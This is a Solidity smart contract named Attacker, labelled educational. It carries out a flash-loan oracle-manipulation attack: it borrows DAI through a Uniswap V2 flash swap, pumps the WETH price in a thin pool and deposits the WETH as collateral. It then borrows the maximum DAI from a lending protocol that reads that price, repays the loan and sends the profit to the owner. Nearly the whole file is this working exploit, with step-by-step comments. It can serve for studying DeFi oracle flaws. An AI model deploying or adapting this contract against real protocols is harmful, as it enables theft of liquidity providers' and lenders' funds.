// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./interfaces/IERC20.sol";
import "./interfaces/IPair.sol";
import "./interfaces/ILending.sol";
import "./interfaces/IUniswapV2Callee.sol";

/// @title Flash Loan Attack Contract
/// @notice Demonstrates how to exploit a price oracle vulnerability using flash loans
/// @dev This contract shows the classic flash loan attack pattern:
///      1. Borrow funds via flash loan (no collateral needed)
///      2. Manipulate DEX price using borrowed funds
///      3. Exploit protocols that rely on manipulated price
///      4. Repay flash loan and keep profits
///
///      ⚠️ FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS ACTIVITIES
contract Attacker is IUniswapV2Callee {
    /// @notice The pool to borrow flash loan from (large liquidity pool)
    IPair public loanPool;

    /// @notice The pool to manipulate price on (small liquidity pool)
    /// @dev This is also the oracle used by the Lending protocol
    IPair public pricePool;

    /// @notice The vulnerable lending protocol to exploit
    ILending public lending;

    /// @notice WETH token contract
    IERC20 public weth;

    /// @notice DAI token contract
    IERC20 public dai;

    /// @notice Owner address (can execute attack and withdraw profits)
    address public owner;

    /// @notice Profit from the last attack (in DAI)
    uint256 public profit;

    /// @notice Emitted when attack begins
    /// @param flashAmount Amount of DAI borrowed via flash loan
    /// @param priceBefore WETH price before manipulation
    event AttackStarted(uint256 flashAmount, uint256 priceBefore);

    /// @notice Emitted after price manipulation
    /// @param daiUsed Amount of DAI used to pump the price
    /// @param wethReceived Amount of WETH received from the swap
    /// @param priceAfter WETH price after manipulation
    event PriceManipulated(uint256 daiUsed, uint256 wethReceived, uint256 priceAfter);

    /// @notice Emitted after exploiting the lending protocol
    /// @param collateralDeposited WETH deposited as collateral
    /// @param daiBorrowed DAI borrowed at inflated price
    event LendingExploited(uint256 collateralDeposited, uint256 daiBorrowed);

    /// @notice Emitted when flash loan is repaid
    /// @param repayAmount Total amount repaid (principal + fee)
    /// @param profit Net profit after repayment
    event FlashLoanRepaid(uint256 repayAmount, uint256 profit);

    /// @notice Emitted with complete attack summary
    event AttackExecuted(
        uint256 flashAmount,
        uint256 wethReceived,
        uint256 priceBefore,
        uint256 priceAfter,
        uint256 borrowedFromLending,
        uint256 profit
    );

    /// @notice Initializes the attack contract
    /// @param _loanPool Pool A - Large pool for flash loan (e.g., 10K WETH + 30M DAI)
    /// @param _pricePool Pool B - Small pool for price manipulation (e.g., 100 WETH + 300K DAI)
    /// @param _lending The vulnerable lending protocol
    /// @param _weth WETH token address
    /// @param _dai DAI token address
    constructor(
        address _loanPool,
        address _pricePool,
        address _lending,
        address _weth,
        address _dai
    ) {
        loanPool = IPair(_loanPool);
        pricePool = IPair(_pricePool);
        lending = ILending(_lending);
        weth = IERC20(_weth);
        dai = IERC20(_dai);
        owner = msg.sender;
    }

    /// @notice Initiates the flash loan attack
    /// @dev Calls swap() with non-empty data to trigger flash loan callback
    /// @param flashAmount Amount of DAI to borrow from loanPool
    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "Only owner");

        // Request flash loan - borrow DAI (token1) from Pool A
        // The "attack" bytes data triggers the callback
        loanPool.swap(0, flashAmount, address(this), "attack");
    }

    /// @notice Flash loan callback - contains the core attack logic
    /// @dev Called by loanPool during the flash swap
    ///
    ///      ATTACK FLOW:
    ///      ┌─────────────────────────────────────────────────────────────────┐
    ///      │ 1. RECEIVE FLASH LOAN                                          │
    ///      │    - Borrow 1,500,000 DAI from Pool A (no collateral)          │
    ///      ├─────────────────────────────────────────────────────────────────┤
    ///      │ 2. MANIPULATE PRICE                                            │
    ///      │    - Swap 90% of borrowed DAI for WETH in Pool B               │
    ///      │    - Price jumps from 3,000 to ~86,842 DAI/WETH                │
    ///      ├─────────────────────────────────────────────────────────────────┤
    ///      │ 3. EXPLOIT LENDING                                             │
    ///      │    - Deposit WETH as collateral                                │
    ///      │    - Borrow DAI at inflated WETH price                         │
    ///      │    - Receive much more DAI than WETH is actually worth         │
    ///      ├─────────────────────────────────────────────────────────────────┤
    ///      │ 4. REPAY FLASH LOAN                                            │
    ///      │    - Return borrowed amount + 0.3% fee to Pool A               │
    ///      │    - Keep remaining DAI as profit                              │
    ///      └─────────────────────────────────────────────────────────────────┘
    ///
    /// @param amount The amount of DAI received from the flash loan
    function uniswapV2Call(
        address,        // sender (unused)
        uint256,        // amount0 (unused, we borrowed token1)
        uint256 amount, // amount1 - the DAI we borrowed
        bytes calldata  // data (unused)
    ) external {
        require(msg.sender == address(loanPool), "Only loanPool");

        // Record price before manipulation
        uint256 priceBefore = pricePool.getPrice();
        emit AttackStarted(amount, priceBefore);

        // ============================================================
        // STEP 1: Manipulate price by buying WETH with borrowed DAI
        // ============================================================
        // Use 90% of flash loan to pump WETH price
        uint256 daiForSwap = (amount * 90) / 100;
        dai.approve(address(pricePool), daiForSwap);

        // Swap DAI for WETH in the small pool (Pool B)
        // This dramatically increases the WETH price
        uint256 wethReceived = pricePool.swapExact(daiForSwap, true);

        uint256 priceAfter = pricePool.getPrice();
        emit PriceManipulated(daiForSwap, wethReceived, priceAfter);

        // ============================================================
        // STEP 2: Exploit lending protocol using inflated price
        // ============================================================
        // Deposit WETH as collateral
        weth.approve(address(lending), wethReceived);
        lending.deposit(wethReceived);

        // Borrow maximum DAI based on artificially high WETH price
        // The lending protocol reads the manipulated price and allows
        // us to borrow far more than our collateral is actually worth
        uint256 borrowAmount = lending.maxBorrow(address(this));
        lending.borrow(borrowAmount);

        emit LendingExploited(wethReceived, borrowAmount);

        // ============================================================
        // STEP 3: Repay flash loan
        // ============================================================
        // Calculate repayment: principal + 0.3% fee
        // Formula: amount * 1000 / 997 + 1 (rounds up)
        uint256 repayAmount = (amount * 1000) / 997 + 1;
        dai.transfer(address(loanPool), repayAmount);

        // Calculate profit (remaining DAI balance)
        profit = dai.balanceOf(address(this));

        emit FlashLoanRepaid(repayAmount, profit);
        emit AttackExecuted(
            amount,
            wethReceived,
            priceBefore,
            priceAfter,
            borrowAmount,
            profit
        );
    }

    /// @notice Withdraws all profits to the owner
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        dai.transfer(owner, dai.balanceOf(address(this)));
    }
}
